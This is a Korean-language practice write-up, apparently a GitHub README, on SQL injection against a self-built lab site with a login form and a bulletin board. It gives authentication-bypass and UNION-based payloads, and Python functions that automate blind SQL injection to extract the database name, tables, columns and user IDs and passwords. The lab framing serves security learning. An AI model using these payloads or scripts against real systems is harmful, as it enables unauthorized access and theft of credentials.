# SQL_Injection 모의해킹

이 예시는 SQL_Injection 공격에 대한 모의해킹을 실습해보는 예시이며, 로그인과 게시판 형태의 form에서 여러가지 기법을 이용하여 SQL_Injection을 수행합니다.


## 로그인 화면

![로그인화면 사진](https://github.com/Tree1st/HK/blob/master/webH/image/SQL_Injection/login.png)


위 웹페이지에서는 로그인 기능을 제공하며, 아이디와 비밀번호를 입력한 뒤 로그인 버튼을 누르면 해당 정보를 토대로 데이터베이스에서  
유저 정보를 가져와 비교하여 로그인 성공여부를 결정합니다.


### 기본 SQL_Injection 공격
다음과 같이 id 입력란에 **'** 를 입력하여 SQL_Injection 공격에 취약한지 확인합니다.

![취약확인 사진](https://github.com/Tree1st/HK/blob/master/webH/image/SQL_Injection/login'.png)
![500](https://github.com/Tree1st/HK/blob/master/webH/image/SQL_Injection/500err.png)

오류가 발생하여 SQL_Injection에 취약점이 있는것으로 짐작할 수 있습니다.

다음은 위의 로그인 폼에서 사용되는 취약한 로그인 쿼리입니다.
``` html
$query = "SELECT * FROM users WHERE id='$id' AND pw='$pw'";
```
다음과 같이 id 입력란에 **'or 1=1 #** 을 입력하면 쿼리에는 
```sql
SELECT * FROM users WHERE id=''or 1=1 #' AND pw='$pw'
```
위와같이 입력되게 되며 쿼리의 조건문이 항상 참이되어 모든 사용자의 정보를 가져올 수 있게되며, 후속 조건문에 의하여 결과값의 가장 첫번째 값인 admin으로 로그인 할 수 있습니다.

![인젝션 사진](https://github.com/Tree1st/HK/blob/master/webH/image/SQL_Injection/login1=1.png)
![로그인성공 사진](https://github.com/Tree1st/HK/blob/master/webH/image/SQL_Injection/admin_login.png)

### Blind_SQL_Injection 공격

Blind_SQL_Injection 이란 일반적인 SQL_Injection과 비슷하게 취약점을 이용하지만, 시간에 따른 응답 결과, 참과 거짓에 따른 응답 결과 등을 분석하여 정보를 얻는 방식입니다.

**1. 데이터 베이스 이름 길이 찾기**

로그인화면에서의 ID 입력란에 `' or 1=1 and length(database())=1#`을 입력해 보면 다음과같은 오류가 뜹니다.

[blind 오류 1]

이 때 숫자를 증가시켜가며 입력해보면  `' or 1=1 and length(database())=4#` 에서 로그인에 성공하여 데이터베이스 이름의 길이가 4글자임을 알 수 있습니다.

이러한 작업을 간편하게 하기위해 Burp Suite 의 Intruder 기능을 이용할 수 있습니다.

[burp payload] , [payload setting]

위와같이 증가시켜줄 부분을 정한 후 다음과 같이 1~10까지의 숫자를 넣는 설정을 한 후 결과 값을 보면 

![image](https://user-images.githubusercontent.com/66786006/221413659-ae57300b-7280-41df-bbe2-ee799cca3dc5.png)

Payload 4 에서 Length가 다른 하나를 확인 할 수 있습니다.

**2. 데이터 베이스 이름 찾기**

데이터 베이스의 이름을 찾기위해서는 `' or 1=1 and ascii(substring(database(), 1~4,1))= 65~128` 을 입력하여 알 수 있습니다. `1~4`와 `65~128`을 각각 넣어봐야 하는데 이를 위하여 위 방법과 동일하게 Burp Suite을 이용할 수 있고 python을 이용하여 자동화 툴을 만들 수 있습니다. 다음은 Blind_SQL_injection을 수행하는 blind_sql.py 코드의 일부 입니다.

``` python
def fun_2(len_db):
    print('processing Fun_2...')
    db_name = ""
    for i in range(len_db):
        for j in range(65, 128):
            inj_str = f"' or 1=1 and ascii(substring(database(), {i+1}, 1)) = {j}#"
            resp = requests.post(url, data=f"id={inj_str}&pw=pw&login=Login", headers={'Content-Type': 'application/x-www-form-urlencoded'})
            if "invalid" not in resp.text:
                db_name += chr(j)
                break
    print (f'DB name: {db_name}')
 ```
 위 코드에서는 요청에대한 결과에서 `invalid` 단어가 없으면 결과에 글자가 추가되는 방식으로 만들었습니다. 이를 실행시켜보면 
 
 [py db 이름]

다음과같이 DB이름이 tree 임을 알아낼 수 있습니다.

**3. 테이블의 길이, 개수 찾기**

```python
def fun_4(dbname):
    print('processing Fun_4...')
    col =[]
    j = 0
    while True:
        i = 0
        while i <=MAX_LENGTH:
            SQLINJq = f"' or 1=1 and length((select table_name from information_schema.tables where table_schema='{dbname}' limit {j},1))={i}#"
            req = requests.post(url,data=f"id={SQLINJq}&pw=pw&login=Login",headers={'Content-Type': 'application/x-www-form-urlencoded'})
            if "invalid" not in req.text:
                #print(f"success with {i}")
                col.append(i)
                break
            i += 1
        if i >50:
            break
        j += 1
    print(col)
    return col
```
각 테이블의 길이와 개수를 알기 위해서는 다음과같은 코드를 사용하였습니다. 1번과 유사한방법으로 테이블의 이름의 길이를찾고, 50글자가 넘는다면 없다고 생각하여 개수를 추측합니다.

[fun4 결과]

결과로는 5글자, 5글자로 총 2개의 결과가 나왔습니다. 

**4. 각 테이블의 이름 찾기**
```python
def fun_5(dbname,table_len):
    print('processing Fun_5...')
    res=[]
    for num_1 in range(len(table_len)):
        col=[]
        for num_2 in range(table_len[num_1]):
            num_3 = 65
            while True:
                SQLINJq = f"' or 1=1 and ascii(substring((select table_name from information_schema.tables where  table_schema='{dbname}' limit {num_1},1),{num_2+1},1)) = {num_3}#"
                req = requests.post(url,data=f"id={SQLINJq}&pw=pw&login=Login",headers={'Content-Type': 'application/x-www-form-urlencoded'})
                if  "invalid" not in req.text:
                    #print(f"success with {num_3}")
                    col.append(chr(num_3))
                    break
                num_3 +=1
        res.append(''.join(col))
    print(res)
    return res
 ```
 2번과 유사한 방식으로 각 테이블의 이름을 찾을 수 있습니다. 입력값의 table_len 값은 3번의 출력과 동일한 [5, 5]로 입력합니다.
 
 [fun 5]
 
 테이블의 이름은 각각 board, usesrs 임을 알 수 있습니다.
 
 **5. 각 테이블별 컬럼이름 길이 찾기**
 ```python
 def fun_6(table_name):
    print('processing Fun_6...')
    res = []
    for name in table_name:
        col = []
        num_1, num_2 = 0, 0
        while num_2 <= MAX_LENGTH:
            SQLINJq = f"' or 1=1 and length((select column_name from information_schema.columns where table_name='{name}' limit {num_1},1))={num_2}#"
            req = requests.post(url, data=f"id={SQLINJq}&pw=pw&login=Login", headers={'Content-Type': 'application/x-www-form-urlencoded'})
            if 'invalid' not in req.text:
                #print(f"success with {num_2}")
                col.append(num_2)
                num_1, num_2 = num_1+1, 0
            else:
                num_2 += 1
        res.append(col)
    print(res)
    return res
 ```
해당 반복문을 돌며 각 테이블별 컬럼 이름의 길이를 찾을 수 있습니다. 이때 MAX_LENGTH 를 임의로 정하여 MAX_LENGTH 에 도달하여도 길이를 찾을 수 없으면 더이상 컬럼이 존재하지 않는 형식으로 만들어져 있습니다. 

[fun 6]

결과는 위 사진과 같이 입력을 ['board','usesrs']을 넣었을 때 각각의 컬럼의 길이가 [4, 7, 7, 4, 3, 4], [4, 19, 17, 29, 24, 2, 2]으로 나오는 것을 확인 할 수 있습니다.

**6. 컬럼이름 찾기**

```python
def fun_7(table_name,col_len):
    print('processing Fun_7...')
    res=[]
    for num_1 in range(len(col_len)):
        col=[]
        for num_2 in range(col_len[num_1]):
            num_3 = 65
            while True:
                SQLINJq = f"' or 1=1 and ascii(substring((select column_name from information_schema.columns where table_name='{table_name}' limit {num_1},1),{num_2+1},1)) = {num_3}#"
                req = requests.post(url,data=f"id={SQLINJq}&pw=pw&login=Login",headers={'Content-Type': 'application/x-www-form-urlencoded'})
                if  "invalid" not in req.text:
                    #print(f"success with {num_3}")
                    col.append(chr(num_3))
                    break
                num_3 +=1
        res.append(''.join(col))
    print(res)
```
컬럼의 이름을 찾는것은 테이블의 이름을 찾는 형식과 유사합니다. 다음은 입력을 `fun_7('users',[4, 19, 17, 29, 24, 2, 2])`으로 했을 때의 결과입니다.

[fun 7]

위에서 찾은 컬럼의 길이와 일치하는 것을 볼 수 있습니다.

**7. 원하는 데이터 얻기**

```python
def fun_8(table_name, col_names):
    print('processing Fun_8...')
    res = []
    
    for col_num, col_name in enumerate(col_names):
        num_0 = 0
        
        while True:
            col = []
            num_1 = 0
            while True:
                end = 0
                for num_2 in range(32, 128):
                    SQLINJq = f"' or 1=1 and ascii(substring((select {col_name} from {table_name} limit {num_0},1),{num_1+1},1))={num_2}#"
                    #print(SQLINJq)
                    req = requests.post(url, data=f"id={SQLINJq}&pw=pw&login=Login", headers={'Content-Type': 'application/x-www-form-urlencoded'})
                    if "invalid" not in req.text:
                        #print(f"success with {num_2}")
                        col.append(chr(num_2))
                        end = 1
                        break
                num_1 += 1
                if not end:
                    break
            if not col:
                break    
            res.append(''.join(col))
            num_0 += 1
    
    print(res)
```
마지막으로는 실제로 컬럼안의 정보를 얻는 작업입니다. 예시로 `users` 테이블의 `id` ,`pw` 컬럼의 정보를 얻기위하여 입력값을 `fun_8('users',['id','pw'])`으로 설정하였습니다.

[fun 8]

로그인 form에서 Blind_SQL_Injection을 이용하여 id 값과 pw 값을 얻는데 성공하였습니다.

## 게시판 화면

[게시판 화면 사진]

위 웹페이지에서는 게시판 기능을 제공하며, 게시글 검색기능을 제공하고 글쓰기를 통하여 첨부파일 포함한 글을 올릴수 있습니다.

### UNION-Based SQL_Injection

게시글 검색에 사용되는 쿼리는 다음과 같으며, 기존의 예시들과 같은 방법으로 SQL_Injection 공격을 수행할 수 있습니다.

``` html
$query = "select * from board where subject LIKE '%$search%'";
```

**1. 컬럼의 개수 찾기**

검색란에 `' UNION SELECT ALL 1,2,3,... # ` 을 입력하여 숫자를 증가시켜 가며 입력하여 컬럼의 개수를 찾습니다.

[컬럼개수 찾기 사진]

**2. 테이블 이름 찾기**

검색란에 `' UNION SELECT ALL 1,table_name,3,4,5,6 FROM information_schema.tables WHERE table_schema=database()#` 을 입력하여 테이블의 이름을 찾습니다.

[테이블 이름찾기 사진]

**3. 원하는 테이블의 컬럼 이름 찾기**

검색란에 2번에서 얻은 테이블 이름을 이용하여 
`' UNION SELECT ALL 1,column_name,3,4,5,6 FROM information_schema.columns where table_name='테이블 이름'#` 을 입력하여 컬럼의 이름을 찾습니다.

[테이블 컬럼 이름찾기 사진]


**4. 해당 컬럼 데이터 얻기**

3번에서 얻은 컬럼의 이름을 바탕으로 각 데이터를 얻을 수 있습니다. `' UNION SELECT ALL 1,id,3,pw,5,6 FROM users#`

[데이터 얻은 사진]

